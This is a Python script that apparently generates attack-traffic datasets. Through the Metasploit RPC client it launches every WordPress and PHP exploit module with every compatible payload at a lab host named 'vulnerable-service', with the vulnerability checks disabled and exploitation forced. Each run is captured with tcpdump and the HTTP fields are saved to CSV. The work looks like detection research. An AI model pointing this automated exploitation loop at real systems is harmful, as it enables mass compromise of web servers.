from pymetasploit3.msfrpc import MsfRpcClient
import subprocess
import time
import pyshark
import csv

client = MsfRpcClient('dL0rHLep', server='127.0.0.1', port=55552)
exploits = client.modules.exploits

for exploit_info in exploits:
    exploit_name = exploit_info
    exploit = client.modules.use('exploit', exploit_name)

    if not (exploit_name.startswith("multi/http/wp") or exploit_name.startswith("multi/http/php") or exploit_name.startswith("multi/php/")) :
        continue

    for payload_info in exploit.targetpayloads():

        payload_name = payload_info
        print(f"Preparing to execute with payload: {payload_name}")

        exploit_to_use = client.modules.use('exploit', exploit_name)

        if not (len(exploit_to_use.missing_required) == 1 and "RHOSTS" in exploit_to_use.missing_required):
            print(exploit_to_use.missing_required)
            continue

        payload = client.modules.use('payload', payload_name)

        if "RHOSTS" in exploit_to_use.missing_required:
            exploit_to_use['RHOSTS'] = 'vulnerable-service'  

        if "LHOST" in payload.missing_required:
            payload['LHOST'] = '127.0.0.1'

        exploit_to_use.check = False

        if "ForceExploit" in exploit_to_use.options:
            exploit_to_use['ForceExploit'] = True 

        capture_file = f"{payload_name}+{exploit_name}.pcap"
        capture_file_csv = f"{payload_name}+{exploit_name}.csv"

        capture_file_replaced = capture_file.replace("/", "-")
        capture_file_csv = capture_file_csv.replace("/", "-")


        tcpdump_command = f'tcpdump -i eth0 -w results/{capture_file_replaced} &'
        subprocess.Popen(tcpdump_command, shell=True, stderr=subprocess.PIPE)
        print(f"Capturing network traffic for {exploit_name}, saving to {capture_file_replaced}...")


        try:
            print(f"Executing exploit {exploit_name} with payload {payload_name}...")
            job_id = exploit_to_use.execute(payload=payload)

            if job_id:
                print(f"Exploit {exploit_name} executed successfully with payload {payload_name}. Job ID: {job_id}")
            else:
                print(f"Failed to execute exploit {exploit_name} with payload {payload_name}")
        
        except Exception as e:
            print(f"An error occurred while executing exploit {exploit_name} with payload {payload_name}: {e}")
        

        print(f"Waiting for capture to finish for {exploit_name}...")
        time.sleep(10)
        subprocess.run(["pkill", "tcpdump"])

        cap = pyshark.FileCapture("results/"+capture_file_replaced)
        with open("results/"+capture_file_csv, 'w', newline='') as csvfile:
            csv_writer = csv.writer(csvfile)
            csv_writer.writerow(['seq', 'protocol', 'size', 'request', 'body'])

            isEmptyCap = None
            try:
                isEmptyCap = next(iter(cap), None)
            except Exception as e:
                print("An error occurred iterating over cap")

            if next(iter(cap), None) is not None:

                for packet in cap:
                    info = "N/A"
                    form_data = "N/A"
                    packet_number = packet.number
                    packet_length = packet.length

                    if not hasattr(packet, 'ip'):
                        continue

                    if 'http' in packet:
                        if hasattr(packet.http, 'chat'):
                            info = getattr(packet.http, 'chat', 'N/A')

                        if hasattr(packet.http, 'request_method') and packet.http.request_method == 'POST':
                            print("Packet HTTP POST detected.")
                            
                            if hasattr(packet.http, 'file_data'):
                                form_data =  getattr(packet.http, 'file_data', 'N/A')

                    csv_writer.writerow([
                        packet_number,
                        packet.highest_layer,
                        packet_length,
                        info,
                        form_data
                    ])
                
        cap.close()

        print(f"File CSV generated: {capture_file_csv}")
        subprocess.run(["rm", "results/"+capture_file_replaced])    